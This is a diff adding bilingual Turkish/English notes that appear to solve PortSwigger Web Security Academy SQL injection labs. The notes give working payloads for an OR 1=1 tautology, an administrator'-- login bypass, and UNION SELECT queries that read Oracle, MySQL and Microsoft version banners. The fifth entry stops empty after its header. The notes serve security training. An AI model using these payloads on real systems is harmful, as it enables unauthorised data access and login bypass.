@@ -4,3 +4,44 @@
 #      SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                 #
 #      WHERE yan tümcesinde gizli verilerin alınmasına izin veren SQL enjeksiyon güvenlik açığı      #
 ######################################################################################################
+
+1--> sql injection payload'ı category parametresi'nde çalıştırabiliyoruz.
+payload => '+OR+1=1--
+GET /filter?category='+OR+1=1-- HTTP/2 şeklinde burpsuite üzerinden görüntüleyebiliyoruz.
+Kullanıcı bir kategori seçtiğinde arka planda çalışan sql kodları => SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+################################################################################
+#      SQL injection vulnerability allowing login bypass                       #
+#      Oturum açmanın atlanmasına izin veren SQL enjeksiyon güvenlik açığı     #
+################################################################################
+
+2--> csrf=$CSRFCOOKIES&username=administrator%27--&password=qwe şeklinde isteği tekrar değiştirip yolluyoruz.
+login kısmına administrator'--
+password qwe gibi random bir değer atayabiliriz.
+
+##############################################################################################
+#      SQL injection attack, querying the database type and version on Oracle                #
+#      SQL enjeksiyon saldırısı, Oracle'da veritabanı tipini ve versiyonunu sorgulama        #
+##############################################################################################
+
+3--> category parametresi üzerinden oracle database verilerini çekiyoruz.
+https://$yourlabsid.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--
+https://$yourlabsid.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+tabloları getir => '+UNION+SELECT+'asd','qwe'+FROM+dual--
+versiyon numarası göster => '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+########################################################################################################
+#      SQL injection attack, querying the database type and version on MySQL and Microsoft             #
+#      SQL enjeksiyon saldırısı, MySQL ve Microsoft'ta veritabanı türünü ve sürümünü sorgulama         #
+########################################################################################################
+
+4--> Burpsuite --> Gifts bölümünde sql injection açığı saldırısı yaparak bilgilere erişilebilir.
+sütun sayıları ve hangi verileri içeriyor => GET /filter?category=Gifts'+UNION+SELECT+'abc','def'#
+versiyon => GET /filter?category=Gifts'+UNION+SELECT+@@version,+NULL#
+
+########################################################################################################
+#      SQL injection attack, listing the database contents on non-Oracle databases                     #
+#      Oracle dışı veritabanlarındaki veritabanı içeriklerini listeleyen SQL enjeksiyon saldırısı      #
+########################################################################################################
+
+5--> 
